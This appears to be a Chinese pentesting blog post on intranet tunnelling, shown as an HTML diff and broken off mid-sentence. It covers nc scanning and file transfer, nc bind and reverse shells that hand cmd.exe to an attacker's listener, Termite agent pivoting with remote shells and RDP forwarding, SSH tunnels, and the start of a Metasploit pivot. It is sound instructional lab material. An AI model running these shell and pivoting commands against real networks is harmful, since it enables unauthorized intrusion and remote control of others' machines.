@@ -1,0 +1,387 @@
+<!DOCTYPE html><html lang="zh-CN "><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hongxiaodou || 内网穿透代理</title>
+    <meta name="author" content="hongxiaodou">
+    <meta name="description" content="林深不见鹿，山巅自相逢 ">
+    <meta name="keywords" content=" ">
+    <link rel="icon" href="/images/1.png">
+    <link rel="stylesheet" href="/css/antd.min.css">
+    
+    <link rel="stylesheet" href="/css/full-theme.css">
+    
+    <script src="/js/vue.js"></script>
+    <script src="/js/antd.min.js"></script>
+<!-- hexo injector head_end start --><style>
+.body hanla:after {
+    content: ' ';
+    display: inline;
+    font-family: Arial;
+    font-size: 0.89em;
+}
+
+html code hanla,
+html pre hanla,
+html kbd hanla,
+html samp hanla {
+    display: none;
+}
+
+html ol > hanla,
+html ul > hanla {
+    display: none;
+}
+</style><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+
+    <div id="loading" style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
+        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
+            <div id="loadcontent" style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#a3ddfb; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
+                <div>
+                    <h2>LOADING...</h2>
+                    <p><hanla></hanla>加载过慢请开启缓存<hanla></hanla>(浏览器默认开启)</p>
+                    <div>
+                        <img src="/dancingkitty.gif" alt="loading">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="layout">
+        <transition name="into">
+            <div v-show="show_page" style="display: none;">
+                <div id="menu_show">
+                     
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">Hongxiaodou</span>
+        </a>
+        
+        <a href="/">
+            <span>
+                <a-icon type="home" theme="filled">
+            </a-icon></span>
+            <span><hanla></hanla>主页</span>
+        </a>
+        
+    </div>
+
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div :class="'title'" @click="menu_show=!menu_show">
+            <span style="margin-right: 10px;">
+                <a-icon type="appstore" theme="filled">
+            </a-icon></span>
+            <span><hanla></hanla>Hongxiaodou</span>
+        </div>
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="home" theme="filled">
+                    </a-icon></div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;"><hanla></hanla>主页</div>
+                </div>
+            </a>
+            
+        </div>
+        <div class="curtain" v-show="menu_show"></div>
+    </div>
+
+</nav>
+                </div>
+
+                <div id="main">
+                     
+<link rel="stylesheet" href="/css/post-body.css">
+<div class="article">
+    <div>
+        <h1>内网穿透代理 </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled">
+            </a-icon></span>
+            2021/10/10
+        </span>
+
+        
+        <span class="category">
+            <a href="/categories/内网篇">
+                <span class="icon">
+                    <a-icon type="book" theme="filled">
+                </a-icon></span>
+                内网篇
+            </a>
+        </span>
+        
+
+        
+    </div>
+
+    <div class="content" v-pre="">
+        <h2 id="NC工具的使用"><a href="#NC工具的使用" class="headerlink" title="NC工具的使用"></a><hanla></hanla>NC<hanla></hanla>工具的使用</h2><span id="more"></span>
+
+<p><hanla></hanla> tcp<hanla></hanla>监听<br><hanla></hanla>nc<hanla></hanla>可以作为<hanla></hanla>server<hanla></hanla>端启动一个<hanla></hanla>tcp<hanla></hanla>的监听，默认情况下下面监听的是一个<hanla></hanla>tcp<hanla></hanla>的端口<br><hanla></hanla>nc -l -p 9999<br>-l 监听 -p 监听的端口<br>客户端测试<br><hanla></hanla>1、在<hanla></hanla>B<hanla></hanla>机器上<hanla></hanla>telnet A<hanla></hanla>机器此端口，如下显示表示<hanla></hanla>B<hanla></hanla>机器可以访问<hanla></hanla>A<hanla></hanla>机器此端口<br><hanla></hanla>telnet 10.0.1.161 9999<br><hanla></hanla>2、B<hanla></hanla>机器上也可以使用<hanla></hanla>nmap<hanla></hanla>扫描<hanla></hanla>A<hanla></hanla>机器的此端口<br><hanla></hanla>nmap 10.0.1.161 -p9999<br><hanla></hanla>3、使用<hanla></hanla>nc<hanla></hanla>命令作为客户端工具进行端口探测<br><hanla></hanla>nc -vz -w 2 10.0.1.161 9999<br><hanla></hanla>（-v<hanla></hanla>可视化，-z<hanla></hanla>扫描时不发送数据，-w<hanla></hanla>超时几秒，后面跟数字）<br>服务端会自动关闭监听。<br><hanla></hanla>4、nc<hanla></hanla>可以扫描连续端口，这个作用非常重要。常常可以用来扫描服务器端口，<br>然后给服务器安全加固<br><hanla></hanla>在客户端<hanla></hanla>B<hanla></hanla>机器上扫描连续的两个端口，如下<br><hanla></hanla>nc -vzw 2 10.0.1.161 9998-9999  </p>
+<p>建立连接<br>可以聊天，但是不加密  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iw71CO"><img src="https://s3.jpg.cm/2021/10/10/Iw71CO.png" alt="Iw71CO.png"></a></p>
+<p>扫端口<br>也可以写范围 8001-8009</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iw7urU"><img src="https://s3.jpg.cm/2021/10/10/Iw7urU.png" alt="Iw7urU.png"></a></p>
+<h2 id="NC传文件"><a href="#NC传文件" class="headerlink" title="NC传文件"></a><hanla></hanla>NC<hanla></hanla>传文件</h2><p><hanla></hanla>方法<hanla></hanla>1，先启动接收命令<br><hanla></hanla>使用<hanla></hanla>nc<hanla></hanla>传输文件还是比较方便的，因为不用<hanla></hanla>scp<hanla></hanla>和<hanla></hanla>rsync<hanla></hanla>那种输入密码的操作了<br><hanla></hanla>把<hanla></hanla>A<hanla></hanla>机器上的一个<hanla></hanla>rpm<hanla></hanla>文件发送到<hanla></hanla>B<hanla></hanla>机器上<br><hanla></hanla>需注意操作次序，receiver<hanla></hanla>先侦听端口，sender<hanla></hanla>向<hanla></hanla>receiver<hanla></hanla>所在机器的该端口发送数  据。  </p>
+<pre><code><hanla></hanla>步骤<hanla></hanla>1，先在<hanla></hanla>B<hanla></hanla>机器上启动一个接收文件的监听，格式如下  
+意思是把赖在<hanla></hanla>9995<hanla></hanla>端口接收到的数据都写到<hanla></hanla>file<hanla></hanla>文件里（这里文件名随意取）  
+格式：nc -l port &gt;file  
+11  
+nc -l -p 9995 &gt;zabbix.rpm  
+步骤<hanla></hanla>2，在<hanla></hanla>A<hanla></hanla>机器上往<hanla></hanla>B<hanla></hanla>机器的<hanla></hanla>9995<hanla></hanla>端口发送数据，把下面<hanla></hanla>rpm<hanla></hanla>包发送过去  
+nc 10.0.1.162 9995 &lt; zabbix-release-2.4-1.el6.noarch.rpm  
+方法<hanla></hanla>2，先启动发送命令  
+步骤<hanla></hanla>1，先在<hanla></hanla>B<hanla></hanla>机器上，启动发送文件命令  
+下面命令表示通过本地的<hanla></hanla>9992<hanla></hanla>端口发送<hanla></hanla>test.mv<hanla></hanla>文件  
+nc -l -p 9992 <test.mv 步骤<hanla="">2，A<hanla></hanla>机器上连接<hanla></hanla>B<hanla></hanla>机器，取接收文件
+下面命令表示通过连接<hanla></hanla>B<hanla></hanla>机器的<hanla></hanla>9992<hanla></hanla>端口接收文件，并把文件存到本目录下，文件名为
+test2.mv
+nc 10.0.1.162 9992 &gt;test2.mv
+</test.mv></code></pre>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iw7Jqw"><img src="https://s3.jpg.cm/2021/10/10/Iw7Jqw.png" alt="Iw7Jqw.png"></a></p>
+<p>这种是服务器监听我传给你<br>反向传，谁监听我我就传给谁 &gt; 把箭头反过来就可以了<br>这种出来的流量防火墙不拦截<br><hanla></hanla>跟<hanla></hanla>linux 也可以是跨平台的  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iw7bdf"><img src="https://s3.jpg.cm/2021/10/10/Iw7bdf.png" alt="Iw7bdf.png"></a></p>
+<h2 id="NC反弹shell"><a href="#NC反弹shell" class="headerlink" title="NC反弹shell"></a><hanla></hanla>NC<hanla></hanla>反弹<hanla></hanla>shell</h2><p><hanla></hanla>方法<hanla></hanla>1、REMOTE<hanla></hanla>主机绑定<hanla></hanla>SHELL<br><hanla></hanla>在公网监听<br><hanla></hanla>nc -l -p 5354 -t -e c:\winnt\system32\cmd.exe<br><hanla></hanla>或者<br><hanla></hanla>nc -l -p 5555 -t -e cmd.exe<br><hanla></hanla>在内网主动建立连接<br><hanla></hanla>nc -nvv 192.168.153.138 5555<br><hanla></hanla>-t<hanla></hanla>是通过<hanla></hanla>telne<hanla></hanla>模式执行 cmd.exe 程序，可以省略。<br><hanla></hanla>讲解：绑定<hanla></hanla>REMOTE<hanla></hanla>主机的<hanla></hanla>CMDSHELL<hanla></hanla>在<hanla></hanla>REMOTE<hanla></hanla>主机的<hanla></hanla>TCP5354<hanla></hanla>端口  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iw7caL"><img src="https://s3.jpg.cm/2021/10/10/Iw7caL.png" alt="Iw7caL.png"></a></p>
+<p><hanla></hanla>方法<hanla></hanla>2、REMOTE<hanla></hanla>主机绑定<hanla></hanla>SHELL<hanla></hanla>并反向连接<br>在公网监听<br><hanla></hanla>nc -lp 5555<br><hanla></hanla>在内网机器反弹<br><hanla></hanla>nc -t -e c:\winnt\system32\cmd.exe 192.168.x.x 5354<br><hanla></hanla>或者<br><hanla></hanla>nc -t -e cmd 192.168.153.140 5555<br><hanla></hanla>讲解：绑定<hanla></hanla>REMOTE<hanla></hanla>主机的<hanla></hanla>CMDSHELL<hanla></hanla>并反向连接到<hanla></hanla>192.168.x.x<hanla></hanla>的<hanla></hanla>TCP5354<hanla></hanla>端口  </p>
+<h2 id="termite工具"><a href="#termite工具" class="headerlink" title="termite工具"></a><hanla></hanla>termite<hanla></hanla>工具</h2><p>内网穿透工具<br><hanla></hanla>termite<br><hanla></hanla>程序地址, <a target="_blank" rel="noopener" href="http://rootkiter.com/Termite/">http://rootkiter.com/Termite/</a><br><hanla></hanla>一款极度小巧灵活的跳板机,<hanla></hanla>有别于传统<hanla></hanla>socks<hanla></hanla>代理,<br><hanla></hanla>它对于复杂内网环境下的渗透适用性更强,<hanla></hanla>操作也极为简便<br>程序分为两部分<br><hanla></hanla>,admin[为控制端]<hanla></hanla>和<hanla></hanla>agent[为代理端节点],<br><hanla></hanla>admin<hanla></hanla>和<hanla></hanla>agent<hanla></hanla>所有选项用途均一致<br><hanla></hanla>-l 指定本地<hanla></hanla>socks<hanla></hanla>端口,<hanla></hanla>等待远程连<br><hanla></hanla>-c 指定远程<hanla></hanla>socks<hanla></hanla>机器<hanla></hanla>ip<br><hanla></hanla>-p 指定远程<hanla></hanla>socks<hanla></hanla>机器端口  </p>
+<p>模拟环境如下<br><hanla></hanla>lnmp01                  假设为我们自己的<hanla></hanla>vps         其公网<hanla></hanla>ip<hanla></hanla>为: 192.168.3.30<br><hanla></hanla>MidLAMP                  目标内网的<hanla></hanla>linux<hanla></hanla>机器         其内网<hanla></hanla>ip<hanla></hanla>为: 192.168.32.192<br><hanla></hanla>win2008r2cn        目标内网的<hanla></hanla>win<hanla></hanla>机器         其内网<hanla></hanla>ip<hanla></hanla>为: 192.168.32.134<br><hanla></hanla>win7cn                入侵者本地内网机器        其内网<hanla></hanla>ip<hanla></hanla>为: 192.168.32.168 [因为这里用虚拟机模拟的,<hanla></hanla>所以内网段和目标一样]</p>
+<p>要实现的最终目的<br><hanla></hanla>通过<hanla></hanla>lnmp01<hanla></hanla>这台机器灵活穿梭于目标内网…  </p>
+<p>环境搭建  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iw7tH8"><img src="https://s3.jpg.cm/2021/10/10/Iw7tH8.png" alt="Iw7tH8.png"></a></p>
+<p><hanla></hanla>windows 2008 这里用<hanla></hanla>08<hanla></hanla>起不来我换成<hanla></hanla>xp<hanla></hanla>了</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iw7Nfi"><img src="https://s3.jpg.cm/2021/10/10/Iw7Nfi.png" alt="Iw7Nfi.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iw7SZk"><img src="https://s3.jpg.cm/2021/10/10/Iw7SZk.png" alt="Iw7SZk.png"></a></p>
+<p>windows2003</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iw7rXe"><img src="https://s3.jpg.cm/2021/10/10/Iw7rXe.png" alt="Iw7rXe.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iw7spy"><img src="https://s3.jpg.cm/2021/10/10/Iw7spy.png" alt="Iw7spy.png"></a></p>
+<p>windows xp</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iw7pKt"><img src="https://s3.jpg.cm/2021/10/10/Iw7pKt.png" alt="Iw7pKt.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iw7wWR"><img src="https://s3.jpg.cm/2021/10/10/Iw7wWR.png" alt="Iw7wWR.png"></a></p>
+<p><hanla></hanla>先让三台电脑两两<hanla></hanla>ping<hanla></hanla>通</p>
+<p><hanla></hanla>首先,<hanla></hanla>在<hanla></hanla>lnmp01<hanla></hanla>机器上执行如下语句,<hanla></hanla>语句成功执行后会返回一个<hanla></hanla>id<hanla></hanla>号,<hanla></hanla>主要用来标识当  前是哪一个<hanla></hanla>agent,<hanla></hanla>后期我们可以很方便的通过这个<hanla></hanla>id<hanla></hanla>号,<hanla></hanla>灵活切换<hanla></hanla>agent,<hanla></hanla>本地的这个端  口其实就是<hanla></hanla>socks<hanla></hanla>代理端口,<hanla></hanla>也就是说,<hanla></hanla>实战中我们可以把目标内网中的所有机器都弹到  这一台指定的<hanla></hanla>vps<hanla></hanla>上<br># ./agent_Linux32 -l 1235 &amp;  </p>
+<p><hanla></hanla>回到目标内网的<hanla></hanla>MidLAMP<hanla></hanla>机器上执行,<hanla></hanla>下面的意思,<hanla></hanla>说的通俗点其实就是建立反向<hanla></hanla>socks<br># ./agent_Linux32 -c 192.168.3.30 -p 1235 &amp;  </p>
+<p><hanla></hanla>再此回到目标内网的<hanla></hanla>win<hanla></hanla>机器上执行<br># agent_Win32.exe -c 192.168.3.30 -p 1235</p>
+<p><hanla></hanla>在本地<hanla></hanla>win7cn<hanla></hanla>上用<hanla></hanla>admin<hanla></hanla>端连接<hanla></hanla>lnmp01<hanla></hanla>机器上刚刚监听的端口,<hanla></hanla>连接成功后会自动进入<hanla></hanla>termite<hanla></hanla>的内置终端,<hanla></hanla>在终端中执行’help’<hanla></hanla>即可看到所有选项用途,’show’<hanla></hanla>一下就可清晰地看到当前<hanla></hanla>agent<hanla></hanla>的地图分布</p>
+<h2 id="test"><a href="#test" class="headerlink" title="test"></a>test</h2><pre><code><hanla></hanla>1. 以服务模式启动一个<hanla></hanla>agent<hanla></hanla>服务。
+&gt; $ ./agent -l 8888
+2. 
+2.<hanla></hanla>令管理端连接到<hanla></hanla>agent<hanla></hanla>并对<hanla></hanla>agent<hanla></hanla>进行管理。
+&gt; $ ./admin -c 127.0.0.1 -p 8888
+3.
+3.<hanla></hanla>此时，admin<hanla></hanla>端会得到一个内置的<hanla></hanla>shell, 输入<hanla></hanla>help<hanla></hanla>指令可以得到帮助信息。
+&gt;&gt; help
+4. 
+4.<hanla></hanla>通过<hanla></hanla>show<hanla></hanla>指令可以得到当前<hanla></hanla>agent<hanla></hanla>的拓扑情况。
+&gt;&gt; show 
+ 
+0M
+ +-- 1M
+ 
+由于当前拓扑中只有一个<hanla></hanla>agent，所以展示结果只有 1M ,
+  其中<hanla></hanla>1 为节点的<hanla></hanla>ID<hanla></hanla>号，
+  M<hanla></hanla>为<hanla></hanla>MacOS<hanla></hanla>系统的简写，Linux<hanla></hanla>为<hanla></hanla>L，Windows<hanla></hanla>简写为<hanla></hanla>W。
+5. 将新<hanla></hanla>agent<hanla></hanla>加入当前拓扑
+&gt; ./agent -c 127.0.0.1 -p 8888
+6. 
+6.<hanla></hanla>此时<hanla></hanla>show<hanla></hanla>指令将得到如下效果
+ 
+0M
+ +-- 1M
+ |   
++-- 2M
+ 
+这表明，当前拓扑中有两个节点，其中由于<hanla></hanla>2<hanla></hanla>节点需要通过<hanla></hanla>1<hanla></hanla>节点才能访问，所以下挂在<hanla></hanla>1<hanla></hanla>节点下方
+7. 在<hanla></hanla>2<hanla></hanla>节点开启<hanla></hanla>socks<hanla></hanla>代理，并绑定在本地端口
+&gt;&gt; goto 2
+    
+将当前被管理节点切换为 2 号节点。
+&gt;&gt; socks 1080
+   
+此时，本地<hanla></hanla>1080 端口会启动个监听服务，而服务提供者为<hanla></hanla>2<hanla></hanla>号节点。
+
+8. 在<hanla></hanla>1<hanla></hanla>号节点开启一个<hanla></hanla>shell<hanla></hanla>并绑定到本地端口
+&gt;&gt; goto 1
+&gt;&gt; shell 7777
+     此时，通过<hanla></hanla>nc<hanla></hanla>本地的 7777 端口，就可以得到一个 1 节点提供的 shell.
+
+9. 将远程的文件下载至本地
+&gt;&gt; goto 1
+&gt;&gt; downfile 1.txt 2.txt
+    将<hanla></hanla>1 节点，目录下的 1.txt 下载至本地，并命名为<hanla></hanla>2.txt
+
+10. 上传文件至远程节点
+&gt;&gt; goto 2
+&gt;&gt; upfile 2.txt 3.txt
+    将本地的 2.txt 上传至 2<hanla></hanla>号节点的目录，并命名为<hanla></hanla>3.txt
+
+11.
+ 端口转接
+&gt;&gt; goto 2 
+&gt;&gt; lcxtran 3388 10.0.0.1 3389
+    以<hanla></hanla>2<hanla></hanla>号节点为跳板，将 10.0.0.1 的 3389 端口映射至本地的 3388 端口
+
+分别让三台服务器监听
+agent_win32.exe -l 6666
+agent_win32.exe -l 7777
+</code></pre>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iw7mrC"><img src="https://s3.jpg.cm/2021/10/10/Iw7mrC.png" alt="Iw7mrC.png"></a></p>
+<p>使用命令 amdi_win32.exe -c 192.168.43.28 -p 6666<br>show 查看连接情况</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iw7ke5"><img src="https://s3.jpg.cm/2021/10/10/Iw7ke5.png" alt="Iw7ke5.png"></a></p>
+<p>然后<br><hanla></hanla>help 查看帮助<br><hanla></hanla>goto 1<br>connect 192.168.5.131 7777<br>goto 2<br>connect 192.168.6.129 8888<br><hanla></hanla>这样就建立了一个隧道<br>使用谁掉用谁<br><hanla></hanla>goto  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iw7Ear"><img src="https://s3.jpg.cm/2021/10/10/Iw7Ear.png" alt="Iw7Ear.png"></a></p>
+<p>可以使用功能</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iw7oHz"><img src="https://s3.jpg.cm/2021/10/10/Iw7oHz.png" alt="Iw7oHz.png"></a></p>
+<p>上传</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iw7fGG"><img src="https://s3.jpg.cm/2021/10/10/Iw7fGG.png" alt="Iw7fGG.png"></a></p>
+<p><hanla></hanla>打开<hanla></hanla>shell 用<hanla></hanla>nc<hanla></hanla>去连接</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iw74gu"><img src="https://s3.jpg.cm/2021/10/10/Iw74gu.png" alt="Iw74gu.png"></a></p>
+<p><hanla></hanla>把对方的<hanla></hanla>3389z<hanla></hanla>转到自己 的<hanla></hanla>1189</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iw7zvX"><img src="https://s3.jpg.cm/2021/10/10/Iw7zvX.png" alt="Iw7zvX.png"></a></p>
+<p>还可以反向连接<br><hanla></hanla>agent_win32.exe -c 192.168.6.128 -p 7777<br>agent_win32 -l 7777<br>agent_win32.exe -c 192.168.5.130 -p 6666<br>agent_win32 -l 6666<br>agent_win32 -l 5555  </p>
+<h2 id="ssh代理穿透内网"><a href="#ssh代理穿透内网" class="headerlink" title="ssh代理穿透内网"></a><hanla></hanla>ssh<hanla></hanla>代理穿透内网</h2><p><hanla></hanla>当前机器<hanla></hanla>A,SSH<hanla></hanla>服务端<hanla></hanla>B,<hanla></hanla>目标服务器<hanla></hanla>C,<hanla></hanla>他们三者之间的关系是<hanla></hanla>A<hanla></hanla>可以<hanla></hanla>SSH<hanla></hanla>访问到<hanla></hanla>B,B<hanla></hanla>可以直接访问<hanla></hanla>C,<hanla></hanla>要达到的效果就<hanla></hanla>A<hanla></hanla>通过<hanla></hanla>SSH<hanla></hanla>端口转发直接访问服务器<hanla></hanla>C.</p>
+<p><hanla></hanla>例如:A<hanla></hanla>为自己在家里的电脑,B<hanla></hanla>为公司提供外网可以<hanla></hanla>SSH<hanla></hanla>访问的服务器<hanla></hanla>B,C<hanla></hanla>为内网服务器.B<hanla></hanla>可以访问内网中的服务器<hanla></hanla>C. 通过以下命令可以实现端口映射,<hanla></hanla>通过<hanla></hanla>SSH<hanla></hanla>服务器将本地端口映射到服务器<hanla></hanla>C<hanla></hanla>对应的端口上,<hanla></hanla>从而实现在本地<hanla></hanla>A<hanla></hanla>直接访问<hanla></hanla>C<hanla></hanla>的目的.</p>
+<h4 id="ssh正向代理"><a href="#ssh正向代理" class="headerlink" title="ssh正向代理"></a><hanla></hanla>ssh<hanla></hanla>正向代理</h4><p><hanla></hanla>在<hanla></hanla>Client<hanla></hanla>机器<hanla></hanla>A<hanla></hanla>执行如下命令:<br><hanla></hanla>ssh -L [本地<hanla></hanla>IP<hanla></hanla>可省略:][本地端口]:[服务器<hanla></hanla>C<hanla></hanla>地址]:[服务器<hanla></hanla>C<hanla></hanla>端口] [SSH<hanla></hanla>服务器<hanla></hanla>IP] -p   [非默认端口<hanla></hanla>22]<br><hanla></hanla>如果使用的是默认<hanla></hanla>SSH<hanla></hanla>端口<hanla></hanla>22 ,<hanla></hanla>则”-p 端口”<hanla></hanla>不用输入.<br>ssh -L 8001:192.168.238.131:8001 <a href="mailto:username@115.13.13.1">username@115.13.13.1</a> -p 22<br>ssh -L 8001:192.168.8.140:80 <a href="mailto:root@192.168.10.131">root@192.168.10.131</a><br><hanla></hanla>这样在访问本机的<hanla></hanla>8001<hanla></hanla>端口,<hanla></hanla>通过<hanla></hanla>SSH<hanla></hanla>服务器<hanla></hanla>B<hanla></hanla>端口转发后,<br><hanla></hanla>实际访问的就是服务器<hanla></hanla>C<hanla></hanla>的<hanla></hanla>8001<hanla></hanla>端口.<br>ssh -L 8001:192.168.238.131:8001 <a href="mailto:username@192.168.0.107">username@192.168.0.107</a><hanla></hanla>（相当于把主机<hanla></hanla>c   的<hanla></hanla>8001 转到本地主机<hanla></hanla>b<hanla></hanla>了）  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iw7gX4"><img src="https://s3.jpg.cm/2021/10/10/Iw7gX4.png" alt="Iw7gX4.png"></a></p>
+<h4 id="ssh反向代理"><a href="#ssh反向代理" class="headerlink" title="ssh反向代理"></a><hanla></hanla>ssh<hanla></hanla>反向代理</h4><p><hanla></hanla>将<hanla></hanla>Client<hanla></hanla>的端口镜像到<hanla></hanla>SSH<hanla></hanla>服务器上,<hanla></hanla>所有可以访问<hanla></hanla>SSH<hanla></hanla>服务器的访问<hanla></hanla>SSH<hanla></hanla>镜像的端口时  即是访问<hanla></hanla>Client<hanla></hanla>的端口.  </p>
+<p><hanla></hanla>ssh -R [SSH<hanla></hanla>服务器<hanla></hanla>IP:][SSH<hanla></hanla>服务器上端口]:[客户端侧<hanla></hanla>IP<hanla></hanla>或能访问到的<hanla></hanla>IP]:[  客户端侧<hanla></hanla>IP<hanla></hanla>端口或能反问的<hanla></hanla>IP<hanla></hanla>的端口] 用户名<hanla></hanla>@SSH<hanla></hanla>服务器<hanla></hanla>IP -p SSH<hanla></hanla>服务器端口  </p>
+<p><hanla></hanla>如果<hanla></hanla>SSH<hanla></hanla>服务器使用的为默认<hanla></hanla>22<hanla></hanla>端口,<hanla></hanla>则后面的”-p SSH<hanla></hanla>服务器端口”<hanla></hanla>不用输入</p>
+<p>ssh -R 192.168.10.131: 81:127.0.0.1:80 <a href="mailto:username@192.168.0.107">username@192.168.0.107</a> -p 2200  </p>
+<p><hanla></hanla>我们把<hanla></hanla>kali<hanla></hanla>开启<hanla></hanla>80，把<hanla></hanla>80<hanla></hanla>端口映射给<hanla></hanla>ssh<hanla></hanla>服务器<hanla></hanla>8001<hanla></hanla>端口<br><hanla></hanla>ssh -R 192.168.10.131:8001:127.0.0.1:80 <a href="mailto:root@192.168.0.107">root@192.168.0.107</a><br><hanla></hanla>我把我自己的<hanla></hanla>80 端口转到你另一个网卡<hanla></hanla>192.168.10.131<hanla></hanla>的<hanla></hanla>8001<hanla></hanla>端口上去   root<hanla></hanla>后门一直写代理服务器的网卡<br><hanla></hanla>这里测试的我虽然写了<hanla></hanla>192.168.10.131   但是他还是只在<hanla></hanla>127.0.0.1:8001<hanla></hanla>所有只有代理额能访问到  </p>
+<p>反向代理就是把我的网站（端口）转发出去，让你内网能访问到  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iw73ep"><img src="https://s3.jpg.cm/2021/10/10/Iw73ep.png" alt="Iw73ep.png"></a></p>
+<h3 id="ssh配置socket代理"><a href="#ssh配置socket代理" class="headerlink" title="ssh配置socket代理"></a><hanla></hanla>ssh<hanla></hanla>配置<hanla></hanla>socket<hanla></hanla>代理</h3><p><hanla></hanla>socket<hanla></hanla>代理 ssh<hanla></hanla>服务器可以访问外网,<hanla></hanla>能访问<hanla></hanla>google,facebook<hanla></hanla>等站点,<br><hanla></hanla>client<hanla></hanla>可以访问<hanla></hanla>ssh<hanla></hanla>服务器但是不能访问<hanla></hanla>google,facebook.<hanla></hanla>如果希望<hanla></hanla>client<hanla></hanla>通过<hanla></hanla>ssh<hanla></hanla>服务器代理访问<hanla></hanla>google,facebook<br><hanla></hanla>通过以下命令可以实现.<br><hanla></hanla>ssh -D 8081 username@SSH<hanla></hanla>服务器<hanla></hanla>IP -p SSH<hanla></hanla>服务器端口<br><hanla></hanla>ssh -D 8081 <a href="mailto:root@192.168.0.107">root@192.168.0.107</a><br><hanla></hanla>本地浏览器上设置<hanla></hanla>socket<hanla></hanla>代理后,<br><hanla></hanla>浏览器即可访问<hanla></hanla>google,facebook<hanla></hanla>站点了.<br><hanla></hanla>或者可以使用<hanla></hanla>proxychain 来扫描<hanla></hanla>socket<hanla></hanla>代理的内网  </p>
+<p><hanla></hanla>ssh<hanla></hanla>配置<hanla></hanla>socket<hanla></hanla>代理渗透内网<br><hanla></hanla>在<hanla></hanla>kali<hanla></hanla>攻击机上设置<hanla></hanla>socket<hanla></hanla>代理<br><hanla></hanla>ssh -D 8081 username@SSH<hanla></hanla>服务器<hanla></hanla>IP -p SSH<hanla></hanla>服务器端口<br><hanla></hanla>ssh -D 8081 <a href="mailto:root@192.168.0.107">root@192.168.0.107</a>  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iw7jWE"><img src="https://s3.jpg.cm/2021/10/10/Iw7jWE.png" alt="Iw7jWE.png"></a></p>
+<p><hanla></hanla>配合<hanla></hanla>proxychians<br><hanla></hanla>配置<hanla></hanla>proxychians<br>vi /etc/proxychains.conf  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iw7KKT"><img src="https://s3.jpg.cm/2021/10/10/Iw7KKT.png" alt="Iw7KKT.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iw7yJQ"><img src="https://s3.jpg.cm/2021/10/10/Iw7yJQ.png" alt="Iw7yJQ.png"></a></p>
+<h2 id="msf穿越多级网络"><a href="#msf穿越多级网络" class="headerlink" title="msf穿越多级网络"></a><hanla></hanla>msf<hanla></hanla>穿越多级网络</h2><p>网络拓扑</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/Iw79gh"><img src="https://s3.jpg.cm/2021/10/10/Iw79gh.png" alt="Iw79gh.png"></a></p>
+<p>说明:<br><hanla></hanla>1)Attacker<hanla></hanla>为攻击者,<hanla></hanla>有一个网卡,<hanla></hanla>网段为<hanla></hanla>172.16.0.0,Attacker<hanla></hanla>系统为<hanla></hanla>kali<hanla></hanla>系统<br><hanla></hanla>2)RD<hanla></hanla>为第一个已经渗透的目标,<hanla></hanla>有两块网卡,<hanla></hanla>对应<hanla></hanla>172.16.0.0<hanla></hanla>和<hanla></hanla>7.7.7.0<hanla></hanla>两个网段<br><hanla></hanla>3)JC<hanla></hanla>有两块网卡,<hanla></hanla>对应<hanla></hanla>7.7.7.0<hanla></hanla>和<hanla></hanla>8.8.8.0<hanla></hanla>两个网段,JC<hanla></hanla>有<hanla></hanla>ms08-067<br><hanla></hanla>4)SK<hanla></hanla>有一块网卡,<hanla></hanla>对应<hanla></hanla>8.8.8.0<hanla></hanla>网段,SK<hanla></hanla>有<hanla></hanla>ms17-010<hanla></hanla>的漏洞<br><hanla></hanla>5)<hanla></hanla>起初<hanla></hanla>Attacker<hanla></hanla>只拿到<hanla></hanla>RD<hanla></hanla>的<hanla></hanla>msf<hanla></hanla>的<hanla></hanla>shell,<hanla></hanla>对于目标内网情况一无所知,<hanla></hanla>也不知道存在<hanla></hanla>7.  